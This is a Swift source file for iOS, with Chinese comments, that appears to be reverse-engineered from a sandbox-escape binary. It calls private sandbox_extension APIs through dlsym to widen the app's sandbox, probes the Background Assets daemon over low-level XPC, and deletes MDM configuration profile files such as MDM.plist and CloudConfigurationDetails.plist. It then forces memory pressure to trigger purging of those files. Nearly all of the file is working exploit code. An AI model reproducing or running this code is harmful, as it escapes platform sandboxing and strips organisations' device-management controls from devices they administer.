//
//  BAPurge.swift
//  Background Assets (BA) purgeable MDM removal
//
//  机制（从 BASandboxEscape 二进制还原）：
//   1. sandbox_extension_issue_file_to_self 为目标路径签发 sandbox token
//   2. consume token 扩大本进程沙箱
//   3. 直接删除 MDM 配置文件
//   4. 制造内存压力，触发系统回收被标记 purgeable 的文件
//
//  注意：iOS 上 NSXPCConnection(machServiceName:) 不可用（macOS only），
//        故一律使用低级 XPC C API（dlsym 获取）。
//

import Foundation
import UIKit

// MARK: - 私有 C API 类型（文件作用域）

private typealias IssueFileToSelfFn = @convention(c) (UnsafePointer<CChar>) -> UnsafeMutablePointer<CChar>?
private typealias IssueFileFn       = @convention(c) (UnsafePointer<CChar>, Int32) -> UnsafeMutablePointer<CChar>?
private typealias ConsumeFn         = @convention(c) (UnsafePointer<CChar>) -> Int64
private typealias XPCConnCreateFn   = @convention(c) (UnsafePointer<CChar>, OpaquePointer?, UInt64) -> OpaquePointer?
private typealias XPCGetPidFn       = @convention(c) (OpaquePointer) -> Int32
private typealias XPCResumeFn       = @convention(c) (OpaquePointer) -> Void

// MARK: - 目标路径

enum MDMPath {
    static let dir = "/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles"
    static let files = [
        "CloudConfigurationDetails.plist",
        "MDM.plist",
        "MCProfileEvents.plist",
        "MDMEvents.plist",
        "ProfileTruth.plist",
        "SharedDeviceConfiguration.plist",
    ]
    static func path(_ f: String) -> String { (dir as NSString).appendingPathComponent(f) }
}

// MARK: - 主逻辑

final class BAPurge {

    static let shared = BAPurge()
    private init() {}

    static var onLog: ((String) -> Void)?
    static func log(_ s: String) { print(s); onLog?(s) }

    private func sym<T>(_ name: String) -> T? {
        guard let h = dlopen(nil, RTLD_NOW), let p = dlsym(h, name) else { return nil }
        return unsafeBitCast(p, to: T.self)
    }

    // MARK: sandbox token

    private func issueToken(path: String) -> String? {
        if let fn: IssueFileToSelfFn = sym("sandbox_extension_issue_file_to_self"),
           let c = fn(path) {
            return String(cString: c)
        }
        if let fn2: IssueFileFn = sym("sandbox_extension_issue_file"),
           let c = fn2(path, getpid()) {
            return String(cString: c)
        }
        BAPurge.log("(bq) 签发失败: \(path)")
        return nil
    }

    @discardableResult
    private func consume(_ token: String) -> Int64 {
        guard let fn: ConsumeFn = sym("sandbox_extension_consume") else { return -1 }
        return fn(token)
    }

    // MARK: 低级 XPC：探测 BA daemon

    private func probeBADaemon() -> Int32 {
        guard let create: XPCConnCreateFn = sym("xpc_connection_create_mach_service") else {
            BAPurge.log("(xpc) 未找到 xpc_connection_create_mach_service")
            return -1
        }
        guard let conn = create("com.apple.backgroundassets.user", nil, 0) else {
            BAPurge.log("(xpc) 创建连接失败")
            return -1
        }
        // 关键：不要 resume！XPC 规定 resume 前必须 set_event_handler，否则 abort（上版闪退根因）。
        // 未 resume 的连接只用于 get_pid 探测，安全。
        guard let getpid: XPCGetPidFn = sym("xpc_connection_get_pid") else {
            BAPurge.log("(xpc) 连接已创建（无法取 PID）")
            return 0
        }
        let pid = getpid(conn)
        BAPurge.log("(xpc) BA daemon PID = \(pid)")
        return pid
    }

    // MARK: 内存压力

    private func applyMemoryPressure() {
        BAPurge.log("(mem) 制造内存压力…")
        var buffers: [UnsafeMutableRawPointer] = []
        let chunk = 8 * 1024 * 1024
        for _ in 0..<96 {
            if let p = malloc(chunk) { memset(p, 0xAB, chunk); buffers.append(p) } else { break }
        }
        BAPurge.log("(mem) 已分配 \(buffers.count * chunk / 1024 / 1024) MB")
        Thread.sleep(forTimeInterval: 2.0)
        for p in buffers { free(p) }
        BAPurge.log("(mem) 已释放")
    }

    // MARK: 一键执行

    func run() {
        let fm = FileManager.default
        BAPurge.log("(mdm) === BA purgeable MDM 移除开始 ===")
        BAPurge.log("(mdm) 目录: \(MDMPath.dir)")

        let pid = probeBADaemon()
        BAPurge.log("(mdm) BA daemon pid=\(pid)")

        if let dirToken = issueToken(path: MDMPath.dir) {
            let h = consume(dirToken)
            BAPurge.log("(mdm) 目录 token consume -> \(h)")
        }

        for f in MDMPath.files {
            BAPurge.log("(mdm) 前 \(f): \(fm.fileExists(atPath: MDMPath.path(f)) ? "存在" : "不存在")")
        }

        for f in MDMPath.files {
            let p = MDMPath.path(f)
            guard fm.fileExists(atPath: p) else { continue }
            if let t = issueToken(path: p) { consume(t) }
            do {
                try fm.removeItem(atPath: p)
                BAPurge.log("(mdm) 已删除 \(f) ✓")
            } catch {
                BAPurge.log("(mdm) 删除 \(f) 失败: \(error.localizedDescription)")
            }
        }

        applyMemoryPressure()

        BAPurge.log("(mdm) === 结果 ===")
        var removed = 0
        for f in MDMPath.files {
            let e = fm.fileExists(atPath: MDMPath.path(f))
            if !e { removed += 1 }
            BAPurge.log("(mdm) \(f): \(e ? "仍存在" : "已清除 ✓")")
        }
        BAPurge.log("(mdm) 清除 \(removed)/\(MDMPath.files.count)，请 Respring 后检查设置")
    }
}
